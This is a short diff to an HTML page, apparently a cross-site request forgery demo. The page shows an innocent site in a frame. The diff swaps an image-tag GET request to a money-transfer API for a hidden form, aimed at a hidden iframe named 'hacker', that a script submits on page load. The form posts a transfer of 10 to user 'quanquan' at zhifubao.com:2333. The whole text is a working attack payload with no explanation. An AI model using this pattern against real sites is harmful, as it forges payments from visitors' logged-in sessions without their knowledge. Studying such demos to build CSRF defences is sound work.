@@ -14,6 +14,17 @@
 </head>
 <body>
   <iframe src="https://www.leshanxxg.com/" frameborder="0"></iframe>
-  <img src="http://zhifubao.com:2333/api/transfer?toUser=quanquan&money=10">
+
+  <iframe src="/" frameborder="0" style="display: none;" name="hacker"></iframe>
+  <form action="http://zhifubao.com:2333/api/transfer" method="post" target="hacker">
+    <input type="hidden" name="toUser" value="quanquan">
+    <input type="hidden" name="money" value="10">
+  </form>
+
+  <script>
+    document.addEventListener('DOMContentLoaded', () => {
+      document.forms[0].submit()
+    })
+  </script>
 </body>
 </html>
